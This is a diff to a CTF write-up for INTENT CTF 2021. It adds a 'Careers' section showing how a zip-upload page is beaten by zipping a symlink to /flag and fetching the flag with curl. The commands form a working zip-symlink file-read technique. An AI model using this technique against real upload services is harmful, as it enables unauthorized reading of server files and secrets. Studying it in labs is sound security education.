@@ -20,7 +20,7 @@ In this challenge, we are presented with an empty page.
 
 ![door-unlocked-page](img/door-unlocked-page.png)
 
-We have an attachment called **ha.cfg**:
+We have an attachment called ```ha.cfg```:
 
 ```apache
 global
@@ -249,7 +249,86 @@ It works now, because there is no dot and the ```path.resolve``` method has the 
 
 ```INTENT{absolutely_great_job_with_the_absolute_path}```
 
+# Careers
 
+![Logo](img/careers-description.png)
+
+## Challenge
+
+![Logo](img/careers-page.png)
+
+We start with a main page and a ```careers.php``` page.
+
+```Upload your CV using txt format only, please archive the files using zip format```
+
+Let's add our zipped resumee to test it:
+
+```
+$ cat resumee-nep1.txt 
+Name: nep1
+
+$ cat resumee-nep1.txt 
+Name: nep1
+
+$ zip resumee-nep1.zip resumee-nep1.txt
+  adding: resumee-nep1.txt (stored 0%)
+```
+
+It created a link for me: ```https://careers.chal.intentsummit.org/upload/9b2b4b582c3df097c6c5b3fea68c8d1f```
+
+![Logo](img/careers-upload-1.png)
+
+And clickling the generated link (```https://careers.chal.intentsummit.org/upload/9b2b4b582c3df097c6c5b3fea68c8d1f/resumee-nep1.txt```) I could see the original resumee txt file.
+
+Other findings:
+* If I generated a zip with multiple files, it would show them.
+* It only showed ```.txt``` files.
+* The files with other extensions (like .php) weren't in the directory (acessing directly without the link).
+
+## Hacking
+
+My very first CTF write-up is still one of the most interesting challenges I got. It was on Defenit CTF 2020, called [TAR Analyzer](https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4). It explains, in portuguese, part of the vulnerability here.
+
+Since the careers page need to unzip the file, it opens some vulnerabilities here. In this case, I used the ```ZIP SymLink Vulnerability```. I can just zip a symbolic link. When decompressed, it will keep being a link in the server file system, to whatever file I need.
+
+You can guess some default places for the flag file. And if you look at the first challenge, they're using ```/flag```. In most challenges it is ```/flag.txt```.
+
+So, let's create the payload.
+
+```bash
+# create the flag simulated file
+$ echo flag{fake} | sudo tee /flag
+flag{fake}
+
+neptunian:~/ctf/intent-ctf-2021/web/writeup/careers$ cat /flag
+flag{fake}
+
+# create the poisoned symlink
+$ ln -s /flag poisoned_symlink.txt
+
+$ cat poisoned_symlink.txt 
+flag{fake}
+
+# create the zip with the payload - note the parameter
+$ zip --symlinks payload.zip poisoned_symlink.txt 
+  adding: poisoned_symlink.txt (stored 0%)
+$ unzip -l payload.zip 
+Archive:  payload.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        5  2021-11-16 14:15   poisoned_symlink.txt
+---------                     -------
+        5                     1 file
+```
+
+And now, after getting the new ".txt" file link:
+
+```
+$ curl -k https://careers.chal.intentsummit.org/upload/1234e827d05414a5c9dd29d30cf145cc/poisoned_symlink.txt
+INTENT{zipfiles_are_awsome_for_pt}
+```
+
+```INTENT{zipfiles_are_awsome_for_pt}```
 
 # References
 
@@ -257,6 +336,7 @@ It works now, because there is no dot and the ```path.resolve``` method has the 
 * CTF Time Event: https://ctftime.org/event/1454
 * INTENT Cybersecurity Summit 2021: https://intentsummit.org/
 * ASISCTF 2021 - ASCII art as a service: https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/
+* Defenit CTF 2020 - TAR Analyzer: https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4
 * Repo with the artifacts discussed here: https://github.com/Neptunians/intent-ctf-2021-writeup
 * Team: [FireShell](https://fireshellsecurity.team/)
 * Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
